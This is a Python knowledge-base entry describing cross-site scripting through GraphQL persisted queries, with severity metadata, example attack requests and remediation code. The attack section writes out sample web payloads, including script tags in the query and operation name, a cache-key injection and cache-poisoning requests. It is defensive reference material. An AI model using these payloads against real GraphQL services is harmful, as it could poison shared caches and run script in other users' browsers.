#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: GraphQL Persisted Query XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via GraphQL Persisted Queries",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "graphql", "persisted", "apq", "cache"],
    "description": """
Persisted/Automatic Persisted Queries (APQ) can be exploited if XSS payloads
are stored in query text or if query hashes are predictable.

SEVERITY: HIGH
Persisted queries are cached. Poisoned cache affects all users.
APQ can be abused to inject malicious queries.
""",
    "attack_vector": """
PERSISTED QUERY POISONING:
POST /graphql
{
  "extensions": {
    "persistedQuery": {
      "sha256Hash": "abc123",
      "version": 1
    }
  },
  "query": "{ user { bio } }"
}
// bio contains XSS, cached for all

APQ REGISTRATION:
// Attacker registers malicious query with known hash
POST /graphql
{
  "query": "{ evilQuery { xss } }",
  "extensions": {
    "persistedQuery": {
      "sha256Hash": "predictable_hash"
    }
  }
}

QUERY DOCUMENT INJECTION:
// If query document is reflected
{
  "query": "<script>alert(1)</script>"
}

CACHE KEY INJECTION:
GET /graphql?extensions={"persistedQuery":{"sha256Hash":"<xss>"}}

OPERATION NAME IN CACHE:
{
  "operationName": "<script>alert(1)</script>",
  "extensions": { ... }
}
""",
    "remediation": """
DEFENSE:

1. USE cryptographic hashes for persisted queries
2. Validate query before registration
3. Don't allow arbitrary query registration
4. Sanitize query responses
5. Use allowlist for persisted queries
6. Clear cache on security updates

SAFE IMPLEMENTATION:
// Allowlist approach - only known queries
const ALLOWED_QUERIES = {
  'sha256:abc123': `{ user { id name } }`,
  'sha256:def456': `{ posts { id title } }`,
};

// Reject unknown hashes
if (!ALLOWED_QUERIES[hash]) {
  throw new Error('Unknown query');
}

APQ CONFIG:
const server = new ApolloServer({
  persistedQueries: {
    cache: new InMemoryLRUCache(),
    // Only allow pre-registered queries
  },
});

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- GraphQL APQ Security
""",
}
